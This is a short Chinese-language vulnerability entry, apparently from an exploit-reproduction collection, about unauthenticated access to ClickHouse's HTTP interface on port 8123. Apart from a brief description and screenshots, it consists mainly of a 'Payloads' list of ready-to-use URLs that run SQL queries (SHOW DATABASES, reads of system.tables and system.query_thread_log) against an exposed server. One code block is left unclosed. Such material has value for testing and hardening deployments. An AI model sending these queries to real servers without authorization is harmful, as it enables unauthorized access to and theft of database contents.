# ClickHouse API 数据库接口未授权访问漏洞

## 漏洞描述
ClickHouse API 数据库接口存在未授权访问漏洞，攻击者通过漏洞可以执行任意SQL命令获取数据库数据

## 危害等级
HIGH

## 参考链接

## 漏洞复现方法
登录页面

![img](images/202202091258079.png)

执行SQL语句

![img](images/202202091258245.png)

```
http://your-ip:8123/?query=SELECT%20*%20FROM%20system.query_thread_log%20LIMIT%201%20FORMAT%20Vertical

## Payloads
```
http://your-ip:8123/?query=SELECT%20*%20FROM%20system.query_thread_log%20LIMIT%201%20FORMAT%20Vertical
```
```
http://your-ip:8123/?query=SHOW%20DATABASES
```
```
http://your-ip:8123/?query=SELECT%20*%20FROM%20system.tables
```
